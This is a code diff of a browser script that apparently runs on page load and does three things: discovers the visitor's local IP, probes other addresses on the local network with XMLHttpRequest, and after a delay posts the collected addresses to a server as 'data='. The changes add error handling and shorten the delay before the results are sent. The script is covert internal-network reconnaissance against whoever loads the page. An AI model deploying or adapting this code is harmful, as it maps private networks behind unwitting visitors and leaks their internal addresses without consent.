@@ -134,6 +134,7 @@ r.send('data='+ data);
 }
 
 function testWeb(ip){
+try {
 var r2 = new XMLHttpRequest();
 r2.open('GET', 'http://'+ ip, true);
 r2.onreadystatechange = function() {
@@ -142,6 +143,7 @@ r2.onreadystatechange = function() {
 	}
 };
 r2.send();
+}catch(e){console.log(e)}
 }
 
 function go() {
@@ -152,8 +154,7 @@ function go() {
 	result += "local: "+ localIp;
 	testWeb(localIp);
     q.queue(function(cb) {
-      probeNet(localIp,
-               function(ip) {
+      probeNet(localIp, function(ip) {
                  //document.getElementById('results').innerHTML += ip + '<br>';
 				 result += "other: "+ ip;
 				testWeb(ip);
@@ -162,7 +163,7 @@ function go() {
     });
   });
 
-	setTimeout(function(){post(result)}, 10000);
+	setTimeout(function(){post(result)}, 8000);
 }
 
 go();
